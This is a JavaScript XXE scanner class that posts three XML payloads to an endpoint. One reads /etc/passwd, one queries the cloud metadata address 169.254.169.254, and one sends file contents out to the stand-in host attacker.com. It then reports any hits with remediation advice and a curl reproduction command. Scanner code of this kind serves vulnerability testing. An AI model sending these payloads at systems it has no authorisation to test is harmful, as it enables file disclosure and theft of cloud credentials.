import axios from 'axios';

export class XXEDetector {
  constructor() {
    this.payloads = [
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'http://attacker.com/?x=%xxe;\'>">%eval;%exfiltrate;]><foo/>',
    ];
  }

  async detect(endpoint) {
    const vulnerabilities = [];

    for (const payload of this.payloads) {
      try {
        const response = await axios.post(endpoint.url, payload, {
          headers: { 'Content-Type': 'application/xml' },
          timeout: 5000,
          validateStatus: () => true
        });

        if (this.isVulnerable(response.data)) {
          vulnerabilities.push({
            type: 'XXE',
            severity: 'CRITICAL',
            url: endpoint.url,
            parameter: 'XML Body',
            payload: payload,
            evidence: response.data.toString().substring(0, 500),
            description: 'XML External Entity (XXE) vulnerability detected',
            impact: 'File disclosure, SSRF, denial of service, potential remote code execution',
            remediation: 'Disable external entity processing in XML parsers, use less complex data formats like JSON',
            cwe: 'CWE-611',
            owasp: 'A05:2021 – Security Misconfiguration',
            reproductionSteps: [
              `1. Send POST request to ${endpoint.url}`,
              `2. Set Content-Type header to application/xml`,
              `3. Include XXE payload in request body`,
              `4. Check response for file contents or SSRF indicators`
            ],
            curlCommand: `curl -X POST "${endpoint.url}" -H "Content-Type: application/xml" -d '${payload.replace(/'/g, "\\'")}'`
          });
          break;
        }
      } catch (error) {}
    }
    return vulnerabilities;
  }

  isVulnerable(data) {
    const dataStr = data.toString();
    return /root:x:0:0/i.test(dataStr) || /ami-id|instance-id/i.test(dataStr);
  }
}
